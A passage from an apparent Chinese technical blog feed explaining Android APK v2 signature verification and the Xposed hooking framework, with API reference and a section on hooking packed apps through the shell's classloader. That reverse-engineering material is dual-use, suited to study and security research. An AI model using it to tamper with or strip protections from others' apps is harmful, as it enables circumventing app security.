title="V2签名"></a>V2签名</h4><h5 id="v1签名的劣势"><a href="#v1签名的劣势" class="headerlink" title="v1签名的劣势"></a>v1签名的劣势</h5><p>从 Android 7.0 开始，Android 支持了一套全新的 V2 签名机制，通过前面的分析，可以发现 v1 签名有两个地方可以改进：</p><p>签名校验速度慢<br>校验过程中需要对apk中所有文件进行摘要计算，在 APK 资源很多、性能较差的机器上签名校验会花费较长时间，导致安装速度慢。</p><p>完整性保障不够<br>META-INF 目录用来存放签名，自然此目录本身是不计入签名校验过程的，可以随意在这个目录中添加文件，比如一些快速批量打包方案就选择在这个目录中添加渠道文件。</p><p>为了解决这两个问题，在 Android 7.0 Nougat 中引入了全新的 APK Signature Scheme v2。</p><h5 id="v2与v1不同"><a href="#v2与v1不同" class="headerlink" title="v2与v1不同"></a>v2与v1不同</h5><p>由于在 v1 仅针对单个 ZIP 条目进行验证，因此，在 APK 签署后可进行许多修改 — 可以移动甚至重新压缩文件。事实上，编译过程中要用到的 ZIPalign 工具就是这么做的，它用于根据正确的字节限制调整 ZIP 条目，以改进运行时性能。而且我们也可以利用这个东西，在打包之后修改 META-INF 目录下面的内容，或者修改 ZIP 的注释来实现多渠道的打包，在 v1 签名中都可以校验通过。</p><p>v2 签名将验证归档中的所有字节，而不是单个 ZIP 条目，因此，在签署后无法再运行 ZIPalign（必须在签名之前执行）。正因如此，现在，在编译过程中，Google 将压缩、调整和签署合并成一步完成。</p><h5 id="v2-签名模式"><a href="#v2-签名模式" class="headerlink" title="v2 签名模式"></a>v2 签名模式</h5><p>简单来说，v2 签名模式在原先 APK 块中增加了一个新的块（签名块），新的块存储了签名，摘要，签名算法，证书链，额外属性等信息，这个块有特定的格式。</p> <img src="/2021/08/22/%E8%AF%81%E4%B9%A6%E4%BD%93%E7%B3%BB/images/%E7%AD%BE%E5%90%8D%E5%AF%B9%E6%AF%94.png" class=""><h5 id="v2签名过程"><a href="#v2签名过程" class="headerlink" title="v2签名过程"></a>v2签名过程</h5><p>首先，说一下 APK 摘要计算规则，对于每个摘要算法，计算结果如下:</p><p>将 APK 中文件 ZIP 条目的内容、ZIP 中央目录、ZIP 中央目录结尾按照 1MB 大小分割成一些小块。<br>计算每个小块的数据摘要，数据内容是 0xa5 + 块字节长度 + 块内容。<br>计算整体的数据摘要，数据内容是 0x5a + 数据块的数量 + 每个数据块的摘要内容<br>总之，就是把 APK 按照 1M 大小分割，分别计算这些分段的摘要，最后把这些分段的摘要在进行计算得到最终的摘要也就是 APK 的摘要。然后将 APK 的摘要 + 数字证书 + 其他属性生成签名数据写入到 APK Signing Block 区块。</p><h5 id="签名校验过程-1"><a href="#签名校验过程-1" class="headerlink" title="签名校验过程"></a>签名校验过程</h5><p>其中 v2 签名机制是在 Android 7.0 以及以上版本才支持。因此对于 Android 7.0 以及以上版本，在安装过程中，如果发现有 v2 签名块，则必须走 v2 签名机制，不能绕过。否则降级走 v1 签名机制。<br>v1 和 v2 签名机制是可以同时存在的，其中对于 v1 和 v2 版本同时存在的时候，v1 版本的 META_INF 的 .SF 文件属性当中有一个 X-Android-APK-Signed 属性：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">X</span>-Android-APK-Signed: <span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><p>因此如果想绕过 v2 走 v1 校验是不行的。</p><p>找到<code>APK 签名分块</code>并验证以下内容：<br>a. <code>APK 签名分块</code>的两个大小字段包含相同的值。<br>b. <code>ZIP 中央目录结尾</code>紧跟在<code>ZIP 中央目录</code>记录后面。<br>c. <code>ZIP 中央目录结尾</code>之后没有任何数据。</p><p>找到<code>APK 签名分块</code>中的第一个<code>APK 签名方案 v2 分块</code>。如果 v2 分块存在，则继续执行第 3 步。否则，回退至使用 v1 方案验证 APK。</p><p>对<code>APK 签名方案 v2 分块</code>中的每个 signer 执行以下操作：<br>a. 从 signatures 中选择安全系数最高的受支持 signature algorithm ID。安全系数排序取决于各个实现/平台版本。<br>b. 使用 public key 并对照<code>signed data</code> 验证 signatures 中对应的 signature。（现在可以安全地解析 <code>signed data</code>了。）<br>c. 验证 digests 和 signatures 中的签名算法 ID 列表（有序列表）是否相同。（这是为了防止删除/添加签名。）<br>d. 使用签名算法所用的同一种摘要算法计算 APK 内容的摘要。<br>e. 验证计算出的摘要是否与 digests 中对应的 digest 相同。<br>f. 验证 certificates 中第一个 certificate 的 SubjectPublicKeyInfo 是否与 public key 相同。</p><p>如果找到了至少一个 signer，并且对于每个找到的 signer，第 3 步都取得了成功，APK 验证将会成功。</p> <img src="/2021/08/22/%E8%AF%81%E4%B9%A6%E4%BD%93%E7%B3%BB/images/v2%E7%AD%BE%E5%90%8D.png" class=""><h5 id="兼容机制"><a href="#兼容机制" class="headerlink" title="兼容机制"></a>兼容机制</h5><p>因为V2签名机制是在Android 7.0中引入的，为了使APK可在Android 7.0以下版本中安装，应先用JAR签名对APK进行签名，再用V2方案进行签名。要注意顺序一定是先JAR签名再V2签名，因为JAR签名需要修改zip<code>数据区</code>和<code>中央目录</code>的内容，先使用V2签名再JAR签名会破坏V2签名的完整性。</p><p>实际上我们在编译APK时并不需要关心这个过程，在Android Plugin for Gradle 2.2中，gradle默认会同时使用JAR签名和V2方案对APK进行签名，如果想要关闭JAR签名或V2签名，可以在build.gradle中进行配置：</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">android &#123;<br>    <span class="hljs-string">...</span><br>    defaultConfig &#123; <span class="hljs-string">...</span> &#125;<br>    signingConfigs &#123;<br>        release &#123;<br>            <span class="hljs-string">...</span><br>            <span class="hljs-string">//</span> v1SigningEnabled <span class="hljs-literal">false</span><br>            v2SigningEnabled <span class="hljs-literal">false</span><br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>在 Android 7.0 中，会优先以 v2方案验证 APK，在Android 7.0以下版本中，系统会忽略 v2 签名，仅验证 v1 签名。Android 7.0+的校验过程如下</p><h5 id="防回滚机制"><a href="#防回滚机制" class="headerlink" title="防回滚机制"></a>防回滚机制</h5><p>因为在经过V2签名的APK中同时带有JAR签名，攻击者可能将APK的V2签名删除，使得Android系统只校验JAR签名。为防范此类攻击，V2方案规定：</p><p>V2签名的APK如果还带JAR签名，其 META-INF/<em>.SF 文件的首部中必须包含 X-Android-APK-Signed 属性。该属性的值是一组以英文逗号分隔的 APK 签名方案 ID（v2 方案的 ID 为 2）。在验证 v1 签名时，对于此组中验证程序首选的 APK 签名方案（例如，v2 方案），如果 APK 没有相应的签名，APK 验证程序必须要拒绝这些 APK。此项保护依赖于内容 META-INF/</em>.SF 文件受 v1 签名保护这一事实。</p><h5 id="常见问题"><a href="#常见问题" class="headerlink" title="常见问题"></a>常见问题</h5><blockquote><p>申请第三方SDK（如微信支付）时填入的SAH1值是什么？</p></blockquote><p>签名证书的指纹，在申请第三方SDK时，需填入APK包名和证书指纹，SDK开发者后台会根据这两个值生成一个key。第三方SDK在初始化时，会从系统中获取当前APK的包名、签名证书指纹以及key，然后将此指纹上传到其服务器，然后校验包名、签名证书指纹是否与此key绑定，校验通过后才进行授权。</p><blockquote><p>目前众多的快速批量打包方案又是如何绕过签名检验的？</p></blockquote><p>在V2方案出现之前，快速批量打包方案有3类：</p><ol><li><p>反编译APK后修改渠道值，再重新打包</p><p>这种方案实际上是重新签名，因有反编译、重新打包、签名的过程，速度相对后两种方案较慢；</p></li><li><p>将渠道信息以文件形式写入META-INF目录中</p><p>因为META-INF目录是用来存放签名的，其本身无法加入签名校验中，在META-INF目录中添加文件不会破坏原有签名。此方案需同时修改zip<code>数据区</code>、<code>中央目录</code>和<code>中央目录结尾记录</code>；</p></li><li><p>将渠道信息写到zip<code>中央目录结尾记录</code>的comment字段中</p><p>通过前面分析zip文件结构，可以发现<code>中央目录结尾记录</code>最后<code>注释</code>字段，这部分内容在JAR签名方案中同样不在签名校验范围中，故添加注释也不会破坏原有签名。此方案只需修改<code>中央目录结尾记录</code>；</p></li></ol><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.jianshu.com<span class="hljs-regexp">/p/</span><span class="hljs-number">308515</span>c94dc6<br>https:<span class="hljs-regexp">//</span>blog.csdn.net<span class="hljs-regexp">/freekiteyu/</span>article<span class="hljs-regexp">/details/</span><span class="hljs-number">84849651</span><br>https:<span class="hljs-regexp">//</span>www.jianshu.com<span class="hljs-regexp">/p/</span>d05e702e0507 -v1源码分析<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>证书</category>
      
    </categories>
    
    
    <tags>
      
      <tag>x509</tag>
      
      <tag>pkcs</tag>
      
      <tag>android签名</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>xposed框架</title>
    <link href="/2021/08/22/xposed%E6%A1%86%E6%9E%B6/"/>
    <url>/2021/08/22/xposed%E6%A1%86%E6%9E%B6/</url>
    
    <content type="html"><![CDATA[<h2 id="1、概述"><a href="#1、概述" class="headerlink" title="1、概述"></a>1、概述</h2><p>hook是Windows中提供的一种用以替换DOS下“中断”的系统机制。每当特定的消息发出，在没有到达目的窗口前，钩子程序就先捕获该消息，亦即钩子函数先得到控制权。这时钩子函数即可以加工处理（改变）该消息，也可以不作处理而继续传递该消息，还可以强制结束消息的传递。</p><p><strong>Xposed框架核心思想:在于将java层普通函数注册成本地JNI方法，以此来变相实现HOOk机制。</strong></p><h3 id="1-1-核心思想"><a href="#1-1-核心思想" class="headerlink" title="1.1 核心思想"></a>1.1 核心思想</h3><p>一、Xposed框架的核心原理</p><p>修改/system/bin/app-process程序。在android执行第一个程序zygote进程之前进行截获，改变执行流程，进入到自身的Main函数体内。Main函数执行体内主要完成以下四步流程：</p><ol><li>initNative(). 为了方便Xposed框架的native方法对上层Java方法的调用，在该部分对相关native方法进行初始化工作。</li><li>initXbrigdeZygote().主要hook几个涉及到应用进程创建，启动的关键类。</li><li>loadModules,读取系统中放置的hook模块，然后把该模块的路径写进conf/moudules.list中。</li><li>Xposed框架加载完毕后，将执行权还给第一个程序zygote,完成正常的系统启动流程。<br>（XPOSED的安装器替换安卓系统的app_process文件，从而实现对系统的接管，通过回调模块的方式来达到不用修改APK就能改变其表现行为的目的。该框架比较成熟，对应的模块也非常多，常用的还有模拟地理位置，伪装手机设备信息等，脑洞是非常之大，基本上能想到的都能做到。）</li></ol><p>app_process其实是一个程序，存放在systen/bin目录下的，作用就是启动一个程序，启动zygote进程，所有App启动。app_process只要找到需要运行程序的main函数，也就是入口函数，然后执行，他不仅能执行C/C++程序，也可以执行Java程序。</p><p>在Android中，zygote是整个系统创建新进程的核心进程。</p><p>Android系统是基于Linux内核的，而在Linux系统中，所有的进程都是Zygoteinit进程的子孙进程，也就是说，所有的进程都是直接或者间接地由Zygoteinit进程fork出来的。</p><p>由于Xposed框架Hook了Android的核心进程Zygote，而其他应用启动都是从Zygote进程fork而来，就够达到针对系统上所有的应用程序进程的Hook。</p><h3 id="1-2-Xposed内部执行流程"><a href="#1-2-Xposed内部执行流程" class="headerlink" title="1.2 Xposed内部执行流程"></a>1.2 Xposed内部执行流程</h3><ul><li><p>创建新应用，获取包名等信息。</p></li><li><p>调用XC_LoadPackage.callAll，依次执行各hook模块的代码。</p></li><li><p>如果有包名匹配的hook模块，则注册模块中要hook的方法为本地方法。</p></li><li><p>当该方被调用的时候，转移到本地xposedCallHandler。</p></li><li><p>xposedCallHandler回调上层handlerHookedMethod(因为加载的hook模块代码，一些变量都存储在java层)。</p></li><li><p>handlerHookedMethod执行加载的各hook模块</p></li></ul><p>beforeHookedMethod 该方法在hook目标方法执行前调用，其中，参数param指的是目标方法的相关参数、回调、方法等信息</p><p>afterHookedMethod该方法在hook目标方法执行后调用，其中，参数param指的是目标方法的相关参数、回调、方法等信息。</p><p>Xposed运行多个模块对同一个方法进行hook时，框架就会根据Xposed模块的优先级来排序，在具有a.before、a.after、b.before、b.after的情    况下，运行的先后顺序如下：（a优先级高于b）</p><p>before -&gt; b.before -&gt;originalMethod -&gt; b.after -&gt; a.after</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs">1、如何Hook静态变量<br>2、如何Hook构造方法<br>3、如何Hook复杂参数的方法<br>4、如何替换函数执行内容<br>5、如何Hook内部类中的函数<br>6、如何Hook匿名类的函数<br>7、如何获取调用对象去调用函数，或者新建新建示例去调用方法<br></code></pre></td></tr></table></figure><p> 学会这些方法，在结合逆向smail的一些知识，应该可以满足大多数java层的hook了。</p><h2 id="2-API"><a href="#2-API" class="headerlink" title="2. API"></a>2. API</h2><ol><li><p>IXposedHookLoadPackage</p><p>方法: handleLoadPackage,这个方法用于在加载应用程序的包的时候执行用户的操作</p><p>参数说明: final LoadPackageParam lpparam 这个参数包含了加载的应用程序的一些基本信息.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java">方法: findAndHookMethod,这是一个辅助方法，可以通过静态导入使用<br><br>参数说明: findAndHookMethod(Class&lt;?&gt; clazz,  ClassLoader，  methodName, Object…，  parameterTypesAndCallback )<br><br><br>Class&lt;?&gt; clazz, <span class="hljs-comment">//需要 Hook 的类名;</span><br><br>ClassLoader，<span class="hljs-comment">//类加载器，可以设置为 null String;</span><br><br>methodName, <span class="hljs-comment">//需要 Hook 的方法名;</span><br><br>Object…，<span class="hljs-comment">//对象类型;  </span><br><br>parameterTypesAndCallback <span class="hljs-comment">//回调方法</span><br></code></pre></td></tr></table></figure></li><li><p>XposedBridge</p><p>方法: log（）,打日志。</p><p>该方法可以将 log 信息以及 Throwable 抛出的异常信息输出到标准的logcat 以及/data/xposed/debug.log 这个文件中 </p><p>无参方法: hookAllMethods/hookAllConstructors，该方法可以用来 hook 某个类中的所有方法或者构造函数，但是不同的Rom（非Android原生 Rom）会有不同的变种。</p></li><li><p>XC_LoadPackage.LoadPackageParam</p><table><thead><tr><th>fields</th><th>type</th><th>description</th></tr></thead><tbody><tr><td>packageName</td><td>String</td><td>应用包名</td></tr><tr><td>processName</td><td>String</td><td>应用加载后的进程名</td></tr><tr><td>classLoader</td><td>ClassLoader</td><td>应用的classloader</td></tr><tr><td>appInfo</td><td>ApplicationInfo</td><td>应用的信息，包括verisonCode，uid等</td></tr></tbody></table></li></ol><ol start="5"><li><p>IXposedHookInitPackageResources</p><p>XposedHookInitPackageResources的resparam参数有以下两个字段</p><table><thead><tr><th>field</th><th>type</th><th>description</th></tr></thead><tbody><tr><td>packageName</td><td>String</td><td>应用包名</td></tr><tr><td>res</td><td>XResources</td><td>资源相关</td></tr></tbody></table></li></ol><ol start="6"><li><p>XposedHelpers</p><ul><li><p>查找类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//className  完整类名，classLoader 类加载器（app应用的类加载器）</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Class&lt;?&gt; findClass(String className, ClassLoader classLoader)<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Class&lt;?&gt; findClassIfExists(String className, ClassLoader classLoader)<br></code></pre></td></tr></table></figure></li><li><p>查找字段</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// clazz 通过findClass获取,调用findFieldRecursiveImpl获取</span><br><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> Field <span class="hljs-title">findFieldRecursiveImpl</span><span class="hljs-params">(Class&lt;?&gt; clazz, String fieldName)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException </span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">return</span> clazz.getDeclaredField(fieldName);<br>        &#125; <span class="hljs-keyword">catch</span> (NoSuchFieldException e) &#123;<br>            <span class="hljs-keyword">while</span> (<span class="hljs-keyword">true</span>) &#123;<br>                clazz = clazz.getSuperclass();<br>                <span class="hljs-keyword">if</span> (clazz == <span class="hljs-keyword">null</span> || clazz.equals(Object.class))<br>                    <span class="hljs-keyword">break</span>;<br><br>                <span class="hljs-keyword">try</span> &#123;<br>                    <span class="hljs-keyword">return</span> clazz.getDeclaredField(fieldName);<br>                &#125; <span class="hljs-keyword">catch</span> (NoSuchFieldException ignored) &#123;&#125;<br>            &#125;<br>            <span class="hljs-keyword">throw</span> e;<br>        &#125;<br>    &#125;<br><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Field <span class="hljs-title">findFirstFieldByExactType</span><span class="hljs-params">(Class&lt;?&gt; clazz, Class&lt;?&gt; type)</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-comment">//获取实例字段的引用</span></span><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title">getObjectField</span><span class="hljs-params">(Object obj, String fieldName)</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"> <span class="hljs-comment">/*获取Field的方法，具体实现是在findFieldRecursiveImpl方法里面获取，外部不能访问，Field是通过getDeclaredField获取，所以只能获取static类型的字段。indFirstFieldByExactType()方法是匹配Field的classType,如果类型一样，则返回该字段，该方法的局限性是只能获取到第一个匹配到的字段，后面相同类型的无法获取*/</span></span><br><span class="hljs-function"></span><br></code></pre></td></tr></table></figure></li><li><p>设置字段</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setXXXField</span><span class="hljs-params">(Object obj, String fieldName, XXX value)</span></span><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setStaticXXXField</span><span class="hljs-params">(Class&lt;?&gt; clazz, String fieldName, XXX value)</span></span><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Xxx <span class="hljs-title">getXxxField</span><span class="hljs-params">(Object obj, String fieldName)</span></span><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Xxx <span class="hljs-title">getStaticXxxField</span><span class="hljs-params">(Class&lt;?&gt; clazzj, String fieldName)</span></span><br></code></pre></td></tr></table></figure></li><li><p>查找方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Method <span class="hljs-title">findMethodExact</span><span class="hljs-params">(Class&lt;?&gt; clazz, String methodName, Object... parameterTypes)</span> </span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Method <span class="hljs-title">findMethodExactIfExists</span><span class="hljs-params">(Class&lt;?&gt; clazz, String methodName, Object... parameterTypes)</span></span><br></code></pre></td></tr></table></figure></li><li><p>调用方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title">callMethod</span><span class="hljs-params">(Object obj, String methodName, Object... args)</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title">callMethod</span><span class="hljs-params">(Object obj, String methodName, Class&lt;?&gt;[] parameterTypes, Object... args)</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title">callStaticMethod</span><span class="hljs-params">(Class&lt;?&gt; clazz, String methodName, Object... args)</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title">callStaticMethod</span><span class="hljs-params">(Class&lt;?&gt; clazz, String methodName, Class&lt;?&gt;[] parameterTypes, Object... args)</span></span><br></code></pre></td></tr></table></figure></li><li><p>调用实例/静态Method，返回值为方法返回值</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> XC_MethodHook.<span class="hljs-function">Unhook <span class="hljs-title">findAndHookMethod</span><span class="hljs-params">(Class&lt;?&gt; clazz, String methodName, Object... parameterTypesAndCallback)</span></span><br><span class="hljs-function"></span><br><span class="hljs-function"><span class="hljs-comment">//通过className和classLoader获取Class&lt;?&gt; ，再调用上面的方法</span></span><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> XC_MethodHook.Unhook <span class="hljs-title">findAndHookMethod</span><span class="hljs-params">(String className, ClassLoader classLoader, String methodName, Object... parameterTypesAndCallback)</span></span><br><span class="hljs-function"></span><br></code></pre></td></tr></table></figure><p>Hook方法的一个方法，其中parameterTypesAndCallback和findConstructorExact方法的parameterTypes类似，不过这里可变数组最后一个对象必须为XC_MethodHook对象或者其子类，前面的对象为参数的ClassType或者类字符串，在hook成功后，当调用hook的方法时，会在XC_MethodHook回调。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">XC_MethodHook</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">XCallback</span> </span>&#123;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">beforeHookedMethod</span><span class="hljs-params">(MethodHookParam param)</span> <span class="hljs-keyword">throws</span> Throwable </span>&#123;<br>                <span class="hljs-comment">//方法调用前的回调</span><br>                <span class="hljs-keyword">super</span>.beforeHookedMethod(param);<br>            &#125;<br><br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">afterHookedMethod</span><span class="hljs-params">(MethodHookParam param)</span> <span class="hljs-keyword">throws</span> Throwable </span>&#123;<br>                <span class="hljs-comment">//方法调用后的回调</span><br>                <span class="hljs-keyword">super</span>.afterHookedMethod(param);<br>            &#125;<br>        &#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">XC_MethodReplacement</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">XC_MethodHook</span></span>&#123;<br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-function"><span class="hljs-keyword">protected</span> Object <span class="hljs-title">replaceHookedMethod</span><span class="hljs-params">(MethodHookParam param)</span> <span class="hljs-keyword">throws</span> Throwable </span>&#123;<br>                <span class="hljs-comment">//带返回值的方法执行时调用</span><br>                <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;<br>            &#125;<br>        &#125;<br>    <br></code></pre></td></tr></table></figure></li><li><p>hook构造器</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Constructor&lt;?&gt; findConstructorExact(Class&lt;?&gt; clazz, Object... parameterTypes)<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Constructor&lt;?&gt; findConstructorExactIfExists(Class&lt;?&gt; clazz, Object... parameterTypes) <br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Constructor&lt;?&gt; findConstructorBestMatch(Class&lt;?&gt; clazz, Class&lt;?&gt;... parameterTypes)<br>  <br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/*获取Constructor方法，其中Object... parameterTypes 是一个Object的可变数组，parameterTypes由Class&lt;?&gt;的可变数组 ，完整类名字符串和XC_MethodHook抽象类 组成。XC_MethodHook为可选参数，并且总在最后一个。XC_MethodHook在这里并无实际意义，Class&lt;?&gt;[] 为相应的构造函数的类型，通过一个例子简单说明，有一个T类，构造函数有三个参数，可以用以下几种方式获取：*/</span><br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">T</span> </span>&#123;<br>    String str;<br>    Context mContext;<br>    View mView;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">T</span><span class="hljs-params">(String str, Context context, View view)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.str = str;<br>        mContext = context;<br>        mView = view;<br><br>    &#125;<br><br>&#125;<br><br><span class="hljs-comment">//方式1：</span><br>Constructor constructor = XposedHelpers.findConstructorExact(clazz, String.class, Context.class, View.class);<br><br><span class="hljs-comment">//方式2：</span><br>Constructor constructor = XposedHelpers.findConstructorExact(T.class, String.class, <span class="hljs-string">&quot;android.content.Context&quot;</span>, View.class);<br><br><span class="hljs-comment">//方式3：（XC_MethodHook无实际意义）</span><br>Constructor constructor = XposedHelpers.findConstructorExact(T.class, String.class, <span class="hljs-string">&quot;android.content.Context&quot;</span>, View.class, <span class="hljs-keyword">new</span> XC_MethodHook() &#123;&#125;);<br></code></pre></td></tr></table></figure></li></ul></li></ol><h2 id="3-Hook加固APP"><a href="#3-Hook加固APP" class="headerlink" title="3. Hook加固APP"></a>3. Hook加固APP</h2><p>一.hook原理</p><p>使用加固之后的应用的classloader会被换成其加固应用本身的，所以只需要在hook的时候把classloader换成壳的就可以了。</p><p>二.具体操作和分析</p><p>被加固的应用是可以反编译的，反编译之后dex里面只有很少的几个类，比较重要的就是壳入口这个类，可以在这个类里面的里面去获取context参数，然后就可以通过context获得到壳的类加载器，之后只需要用这个类加载器来hook就可以成功的hook到加固的app</p><p>注：</p><p>Android源码中<a href="http://androidxref.com/7.1.2_r36/xref/frameworks/base/core/java/android/app/Application.java#188">android.app.Applocation 188行</a>,attachBaseContext方法在Application的attach方法被调用，基本上所有的壳都会在attachBaseContext里完成代码解密并且内存加载dex，所以在<br>attachBaseContext执行之后，拿到的classloader就已经加载过加固dex的classloader。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span 